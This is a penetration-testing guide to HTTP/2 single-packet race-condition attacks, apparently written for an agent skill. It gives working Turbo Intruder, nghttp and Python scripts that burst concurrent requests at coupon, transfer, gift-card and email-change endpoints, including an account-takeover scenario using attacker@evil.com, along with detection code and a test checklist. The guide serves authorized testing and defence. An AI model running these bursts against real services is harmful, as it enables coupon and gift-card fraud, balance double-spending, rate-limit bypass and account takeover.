# HTTP/2 Single-Packet Attack

> **Security Boundary Statement**
>
> This document is for **authorized penetration testing** only.
>
> - Validates race condition vulnerability via HTTP/2 single-packet technique
> - Proves timing-sensitive vulnerability exists; **no real fraud or financial exploitation**
> - Uses safe test values only; **no real payment or purchase circumvention**
> - See `SKILL.md` for execution boundaries

---

## Source: PortSwigger Research (2023), James Kettle — Smashing the State Machine

## Background

HTTP/2 allows sending multiple requests in a **single TCP packet**. This eliminates network timing jitter, making it possible to deliver 20-30+ requests that arrive at the server simultaneously — within microseconds of each other, not milliseconds.

This defeats application-level rate limiting and timing-based defenses against race conditions.

**Classic race condition problem**: Two requests arrive 50-200ms apart. Server processes them sequentially. State machine sees first request, updates state, second request hits the new state.

**HTTP/2 single-packet fix**: Both requests arrive in the same packet. Server reads them in rapid succession before any async state update completes.

---

## Validation Objectives

| Validation Content | Default | Requires Authorization | Prohibited |
|---|---|---|---|
| Single-packet delivery proof | ✓ Time delta measurement | - | Real financial exploitation |
| Race condition detection | ✓ Safe test values | - | Real purchase/payment bypass |
| Rate limit bypass proof | ✓ Measure request rate | - | Sustained DoS |
| Token/email race | ✓ Duplicate request | - | Account takeover |

---

## 1. Technique: HTTP/2 Single-Packet

### Using Burp Suite (Turbo Intruder)

```python
# Turbo Intruder — HTTP/2 single-packet attack
# Install: Burp BApp Store -> Turbo Intruder

# Single-packet attack script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # These requests will be sent in a single HTTP/2 packet
    for i in range(20):
        engine.queue(target.req, i)
    
    # 'gate' controls when the packet is actually sent
    # Set engine.openGate() to release all queued requests simultaneously
    engine.openGate()

def handleResponse(req, interesting):
    table.add(req)
```

### Using raw HTTP/2 (h2spec / custom)

```bash
# Using nghttp2 to send concurrent streams
# Install: apt install nghttp2-client

# Single-packet attempt: send multiple HEADERS frames before any DATA
nghttp -v -H "authorization: bearer TOKEN" \
  -d '{"coupon":"TEST2026","amount":100}' \
  -m 20 \
  https://{target}/api/apply-coupon

# -m 20: send 20 requests concurrently
# nghttp2 multiplexes them over a single connection
```

### Using Python httpx (h2)

```python
import asyncio
import httpx
import time

async def single_packet_attack(url, headers, payload, count=20):
    """Send multiple requests in parallel over a single HTTP/2 connection."""
    async with httpx.AsyncClient(http2=True) as client:
        tasks = []
        
        # Queue all requests before awaiting any
        for i in range(count):
            task = client.post(url, json=payload, headers=headers)
            tasks.append(task)
        
        # Fire all requests simultaneously
        t0 = time.perf_counter()
        responses = await asyncio.gather(*tasks)
        elapsed = time.perf_counter() - t0
        
        for i, resp in enumerate(responses):
            print(f"[{i}] {resp.status_code} - {resp.text[:100]}")
        
        print(f"\nTotal time: {elapsed*1000:.1f}ms for {count} requests")
        
        # If any two responses indicate different state -> race condition confirmed
        status_codes = [r.status_code for r in responses]
        unique_states = len(set(status_codes))
        if unique_states > 1:
            print(f"RACE CONDITION LIKELY: {unique_states} different responses")
        
        return responses

# Usage:
asyncio.run(single_packet_attack(
    url="https://{target}/api/apply-coupon",
    headers={"Authorization": "Bearer TOKEN"},
    payload={"coupon_code": "PENTEST_TEST_COUPON"},
    count=20
))
```

---

## 2. Attack Scenarios

### Coupon / discount race

```python
# Scenario: Apply same coupon code multiple times
# Single-packet: all requests arrive before coupon state is marked "used"

# Safe test: use a test coupon that the operator created
payload = {"coupon": "PENTEST_TEST_ONLY", "order_id": "test-order-001"}

# Expected (secure): only first request succeeds, rest get "already used"
# Vulnerable: multiple requests succeed -> coupon applied N times
```

### Email change race

```python
# Scenario: Change email to attacker@evil.com
# If confirmation is checked async, race allows:
# Request 1: change email to attacker@evil.com
# Request 2: trigger password reset (to old email before update)
# Single-packet makes both arrive before email update commits

payload = {"new_email": "attacker@evil.com"}
# Then immediately:
reset_payload = {"email": "original@company.com"}  # or new email
```

### Transfer race

```python
# Scenario: Transfer from account A with $100 balance
# Two concurrent transfers of $100 each
# If balance check is async, both might succeed

# Safe test: use test account with test currency only
payload = {"amount": 100, "currency": "TEST"}

# Vulnerable if: both requests return success -> balance goes to -$100
```

### Gift card redemption race

```python
# Scenario: Redeem same gift card on two accounts simultaneously
# Single-packet: send redemption from account A and account B at once

# Safe test: operator-created gift card
payload_a = {"code": "PENTEST-GC-001", "account": "test_a"}
payload_b = {"code": "PENTEST-GC-001", "account": "test_b"}
```

---

## 3. Detection Patterns

### Time-based detection

```python
# Compare sequential vs single-packet timing
import statistics

def detect_race_condition(url, headers, payload, sequential_n=5, parallel_n=20):
    """Compare sequential vs concurrent responses to detect race conditions."""
    
    # Sequential — establish baseline
    seq_results = []
    for i in range(sequential_n):
        r = requests.post(url, json=payload, headers=headers)
        seq_results.append((r.status_code, r.json()))
    
    # Single-packet — look for inconsistent results
    # (Use the async version above)
    # If parallel responses differ from sequential -> race condition
    
    seq_states = set(str(r) for r in seq_results)
    print(f"Sequential: {len(seq_states)} unique responses")
    print(f"If single-packet shows >1 unique response -> RACE CONDITION")
```

### Response diff

```python
# Compare all responses from single-packet burst
def analyze_responses(responses):
    """Find inconsistencies in parallel responses."""
    bodies = [r.text for r in responses]
    codes = [r.status_code for r in responses]
    
    unique_codes = set(codes)
    unique_bodies = set(bodies)
    
    if len(unique_codes) > 1:
        print(f"MIXED STATUS CODES: {dict(Counter(codes))}")
        print("-> Race condition confirmed")
    
    if len(unique_bodies) > 1:
        print(f"MIXED RESPONSE BODIES:")
        for body in unique_bodies:
            print(f"  {body[:200]}")
        print("-> Race condition confirmed")
    
    return len(unique_codes) > 1 or len(unique_bodies) > 1
```

---

## 4. Tools

| Tool | Use | Install |
|---|---|---|
| Burp Turbo Intruder | GUI-based single-packet attack | Burp BApp Store |
| nghttp2 | CLI HTTP/2 client | `apt install nghttp2-client` |
| httpx (Python) | Async HTTP/2 client | `pip install httpx[h2]` |
| h2load | HTTP/2 load testing | `apt install nghttp2-client` |
| hyperfoil | HTTP/2 benchmarking | Java-based |

---

## 5. Upgrade from HTTP/1.1 Race Techniques

| HTTP/1.1 Technique | Limitation | HTTP/2 Advantage |
|---|---|---|
| Last-byte sync | 50-200ms jitter | Single packet: <1μs jitter |
| Turbo Intruder HTTP/1 | Timing dependent | H2 multiplexing eliminates timing |
| Parallel connections | Connection-level throttling | Single connection, multiple streams |
| HTTP pipelining | Rarely supported | H2 multiplexing is standard |

---

## Severity Classification

HTTP/2 single-packet race testing defaults to low severity — timing anomaly/response inconsistency does not equal bypass succeeding. Only when **race actually bypasses business constraints** is escalation required.

| Actual case | Severity | Note |
|---------|------|------|
| asset/fund operation race bypass confirmed (balance double-spend / repeated deduction or issuance takes effect on the same test value) | High | business constraint is actually broken (prove only with safe test values) |
| race proof with security-test values (test-only coupon/test currency consumed multiple times) | Medium | test-only scenariobypassconfirmed, no real financial impact |
| race suspected (response inconsistency/timing anomaly without confirmed business-constraint bypass) | Low | suspicious signal, exploit chain not closed |

**Key judgment**:High requires"business constraint is actually broken"and must be proven only with security-test values - testing real fund/asset double-spend is prohibited. timing anomaly without achieved bypass is Low. 

---

## Detection Checklist

| Item | Check | Pass Criteria |
|---|---|---|
| Coupon race | Send 20 concurrent coupon applies | Only 1 succeeds |
| Balance race | Send 2 concurrent max-balance transfers | Second rejected |
| Email change race | Concurrent email change + password reset | Password reset goes to correct email |
| Gift card race | Redeem from 2 sessions simultaneously | Only 1 redemption succeeds |
| Rate limit bypass | Single-packet burst of 50 requests | Rate limit still enforced |
| Idempotency | Same request sent 20 times | Only 1 side effect |
